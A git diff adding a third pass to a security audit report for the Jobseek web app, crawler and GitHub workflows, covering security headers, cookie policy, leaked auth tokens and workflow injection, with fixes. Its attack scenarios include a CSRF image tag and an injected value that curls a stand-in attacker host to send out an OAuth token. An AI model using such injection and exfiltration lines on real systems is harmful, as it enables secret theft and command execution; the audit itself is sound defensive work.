@@ -1,18 +1,20 @@
 # Security Audit — Jobseek
 
 **Date:** 2026-03-31
-**Scope:** `apps/web/` (Next.js 15, API routes)
+**Scope:** `apps/web/` (Next.js 15, API routes), `apps/crawler/` (Python), `.github/workflows/`
 **Branch:** `security`
 
 ---
 
 ## Summary
 
-Eleven vulnerabilities were identified and fixed across two audit passes. Two are
+Fifteen vulnerabilities were identified and fixed across three audit passes. Two are
 critical (unauthenticated subscription-granting and unauthenticated actor
 triggering), three are high severity (free access to paid features and business
-intelligence), and six are medium severity (SSRF surface, timing side-channels,
-missing brute-force protection, and a Stripe replay-attack window).
+intelligence), and ten are medium severity (SSRF surface, timing side-channels,
+missing brute-force protection, a Stripe replay-attack window, missing security
+headers, auth token credential exposure, cookie misconfiguration, and a workflow
+injection hardening gap).
 
 ### Audit Pass 1 (2026-03-31)
 
@@ -35,6 +37,15 @@ missing brute-force protection, and a Stripe replay-attack window).
 | 10 | MEDIUM | `src/lib/admin/basic-auth.ts` (`matchesBasicAuthorization`) | Fixed |
 | 11 | MEDIUM | `app/agentic/api/auth/login/route.ts` | Fixed |
 | 12 | MEDIUM | `app/api/stripe/webhook/route.ts` (replay attack) | Fixed |
+
+### Audit Pass 3 (2026-03-31)
+
+| # | Severity | File | Status |
+|---|----------|------|--------|
+| 13 | MEDIUM | `apps/web/next.config.ts` (missing security headers: CSP, X-Frame-Options, X-Content-Type-Options) | Fixed |
+| 14 | MEDIUM | `app/agentic/api/auth/login/route.ts` (SameSite=Lax on admin session cookie) | Fixed |
+| 15 | MEDIUM | `apps/crawler/src/shared/api_sniff.py` (`clean_headers` leaks auth tokens to DB) | Fixed |
+| 16 | LOW | `.github/workflows/resolve-company-requests.yml` (workflow injection hardening) | Fixed |
 
 ---
 
@@ -343,3 +354,164 @@ already in place:
 4. **Review Apify dataset visibility** — Apify datasets created by the actor runs
    may be publicly readable via the Apify platform if the actor was not configured
    with `DATASET_IS_PUBLIC: false`. Audit Apify actor settings.
+
+---
+
+## Audit Pass 3 Findings
+
+### 13. MEDIUM — Missing Security Headers (CSP, X-Frame-Options, X-Content-Type-Options)
+
+**File:** `apps/web/next.config.ts`
+
+**Description:**
+The Next.js application served no `Content-Security-Policy`, `X-Frame-Options`,
+`X-Content-Type-Options`, `Referrer-Policy`, or `Permissions-Policy` headers on
+any route. The absence of these headers enables several classes of attack:
+
+- **Clickjacking**: Without `X-Frame-Options` or `frame-ancestors`, any third-party
+  site can embed the application in an invisible iframe and trick authenticated users
+  into performing unintended actions (e.g., changing account settings, making
+  purchases).
+- **XSS escalation**: Without a `Content-Security-Policy`, any Cross-Site Scripting
+  vulnerability (including those from third-party libraries) can execute arbitrary
+  JavaScript with no browser-enforced sandbox. With CSP, an XSS payload that cannot
+  load external scripts or exfiltrate data via `connect-src` is substantially
+  constrained.
+- **MIME sniffing**: Without `X-Content-Type-Options: nosniff`, browsers may
+  interpret responses with ambiguous `Content-Type` headers (e.g., user-uploaded
+  content) as executable HTML or JavaScript.
+- **Information leakage**: Without `Referrer-Policy`, the full URL (including
+  path and query string) is sent as the `Referer` header to every third-party
+  resource, leaking authenticated session paths to external servers.
+
+**Fix:**
+Added a global `/:path*` header rule in `next.config.ts` that sets:
+- `X-Frame-Options: SAMEORIGIN`
+- `X-Content-Type-Options: nosniff`
+- `Referrer-Policy: strict-origin-when-cross-origin`
+- `Permissions-Policy: camera=(), microphone=(), geolocation=()`
+- `Content-Security-Policy` with `default-src 'self'`, `script-src 'self' 'unsafe-inline'`
+  (Next.js requires `unsafe-inline` for its runtime bootstrap), `img-src` allowing
+  the trusted R2 CDN domain, and `frame-ancestors 'self'`.
+
+**Note:** `'unsafe-inline'` for scripts is required by the current Next.js
+runtime. The next hardening step would be to move to nonce-based CSP using
+Next.js middleware, which eliminates the need for `'unsafe-inline'` entirely.
+
+---
+
+### 14. MEDIUM — Admin Session Cookie `SameSite=Lax` Instead of `Strict`
+
+**File:** `app/agentic/api/auth/login/route.ts`
+
+**Description:**
+The `admin_session` JWT cookie was set with `SameSite=Lax`. The `Lax` policy
+allows the cookie to be sent with top-level `GET` navigations from third-party
+sites (e.g., links in emails, social media). An attacker could construct a URL
+to a GET-based admin endpoint and embed it as an image `src` or redirect target
+on an attacker-controlled page. When a logged-in admin visits the attacker's
+page, their browser automatically includes the `admin_session` cookie in the
+request (CSRF via cross-site GET).
+
+While the agentic admin panel currently requires `POST` for all state-changing
+actions, `Lax` leaves a residual CSRF surface for any current or future `GET`
+endpoint that has side effects. Using `Strict` eliminates this entirely: the
+cookie is only sent when the navigation originated from the same site.
+
+**Attack scenario:**
+```html
+<!-- Attacker's page -->
+<img src="https://jseek.co/agentic/some-admin-get-endpoint" />
+<!-- Admin's browser sends admin_session cookie — Lax allows this -->
+```
+
+**Fix:**
+Changed `sameSite: "lax"` to `sameSite: "strict"` on the `admin_session` cookie.
+The agentic admin panel is always accessed directly (not via cross-site links),
+so `Strict` has no usability impact.
+
+---
+
+### 15. MEDIUM — Captured Auth Tokens Persisted in Board Config (Credential Exposure)
+
+**File:** `apps/crawler/src/shared/api_sniff.py` (`clean_headers` / `_SKIP_HEADERS`)
+
+**Description:**
+The `clean_headers()` function strips headers that should not be forwarded in
+replayed API requests or stored in the board metadata database. However,
+`_SKIP_HEADERS` only excluded connection-level headers (`host`, `connection`,
+`content-length`, `accept-encoding`, `transfer-encoding`). Auth-bearing headers
+— `Authorization`, `Cookie`, `X-API-Key`, `X-Auth-Token` — were **not** excluded.
+
+During Playwright-based API sniffing (`api_sniffer.py`), all XHR/fetch requests
+are captured including their request headers. When the sniffer finds a high-scoring
+API endpoint, it stores the cleaned headers in `meta["request_headers"]` as part
+of the board config (written to the `job_board.metadata` column in PostgreSQL and
+exported to Supabase). This means short-lived session cookies and API keys for
+third-party career platforms could be:
+
+1. **Persisted to the database** — visible to anyone with DB read access.
+2. **Exported to Supabase** — visible to anyone with Supabase table access.
+3. **Used in subsequent replay requests** — the sniffer replays stored headers
+   for board monitoring; a leaked `Authorization` header in config would be
+   replayed repeatedly until the token expires.
+
+**Attack scenario:**
+A company career page that requires a session-based auth token (e.g., an internal
+ATS using company SSO) would have the session token captured during Playwright
+sniffing, stored in the board metadata, and replayed on every subsequent crawl.
+If the DB metadata were logged or exposed, this constitutes a credential breach.
+
+**Fix:**
+Extended `_SKIP_HEADERS` to include: `authorization`, `cookie`, `set-cookie`,
+`x-api-key`, `x-auth-token`, `x-access-token`, `x-csrf-token`, `x-session-token`,
+`proxy-authorization`. These headers are now stripped before headers are stored
+in board config or used in replayed requests.
+
+---
+
+### 16. LOW — Workflow Injection Hardening Gap
+
+**File:** `.github/workflows/resolve-company-requests.yml`
+
+**Description:**
+The `Resolve issue` step interpolated `${{ steps.select.outputs.selected }}` —
+the GitHub Actions step output containing the selected issue number — directly
+into a shell `run:` script string. Although `select-issue.sh` only ever writes
+a bare integer to `GITHUB_OUTPUT`, direct `${{ ... }}` interpolation inside a
+`run:` step is a recognized anti-pattern (documented by GitHub Security Lab).
+Any future change to `select-issue.sh` that outputs non-numeric content (e.g.,
+a branch name containing shell metacharacters) would immediately become a shell
+injection vulnerability, allowing arbitrary command execution in the workflow
+runner with access to all repository secrets.
+
+**Attack scenario:**
+If `select-issue.sh` were modified to output, or if a future code path produced
+a value like `1; curl https://attacker.com/exfil -d "$CLAUDE_CODE_OAUTH_TOKEN"`,
+that string would execute verbatim in the shell. The workflow runs with access to
+`CLAUDE_CODE_OAUTH_TOKEN` and `GH_TOKEN`, making this a high-value target.
+
+**Fix:**
+Moved the interpolated value to an environment variable (`ISSUE_NUMBER`) and
+added an integer validation guard (`[[ "$ISSUE_NUMBER" =~ ^[0-9]+$ ]]`) before
+it is used in the shell script. The shell now references `${ISSUE_NUMBER}` rather
+than the raw `${{ ... }}` expression, following GitHub's recommended pattern for
+preventing script injection.
+
+---
+
+## Pass 3 — Areas Reviewed with No Issues Found
+
+| Area | Finding |
+|------|---------|
+| SQL injection in asyncpg queries (`queries/monitor.py`, `queries/scrape.py`, `queries/lookups.py`) | All queries use `$N` positional parameters. No f-string interpolation of user data into SQL. |
+| SQL injection in `bootstrap.py` and `exporter.py` f-string SQL | Column names in f-strings are hardcoded Python lists (`_BOARD_COLUMNS`, `_POSTING_COLUMNS`), not user-controlled. |
+| SSRF via `board_url` redirect following | `board_url` values are admin-configured (from `boards.csv`), not user-supplied. No untrusted-user SSRF surface. |
+| Redis key injection | `board_id` and `posting_id` are PostgreSQL UUID primary keys; `domain` comes from `urlparse().hostname`. No user-controlled key prefix injection possible. |
+| R2 upload path traversal | `posting_id` is a UUID from DB; `locale` comes from parsed API response but R2/S3 does not treat `..` as filesystem traversal — object keys are opaque strings. Low residual risk. |
+| Next.js server actions auth | All mutation actions (`toggleSavedJob`, `toggleStarredCompany`, `updatePreferences`, etc.) gate on `getSessionUserId()` which returns `null` for unauthenticated callers; callers return early with error/empty results. |
+| Next.js middleware coverage | Middleware only handles locale redirection; no auth enforcement at middleware level. Auth is enforced at the action/route level individually. Appropriate for this architecture. |
+| `NEXT_PUBLIC_` env var exposure | Only `NEXT_PUBLIC_SITE_URL` and `NEXT_PUBLIC_PORTAL_URL` are exposed — both are public site URLs with no secrets. |
+| GitHub Actions third-party action pinning | All actions pinned to full commit SHAs with version comment. |
+| GitHub Actions secrets in logs | Secrets are only passed via `env:` blocks, never directly interpolated into `run:` echo statements. |
+| `label-rejected-requests.yml` injection | The workflow fetches the comment body via the GitHub API (`gh api`) into a local variable rather than interpolating `${{ github.event.comment.body }}` into the shell — correctly defended. |
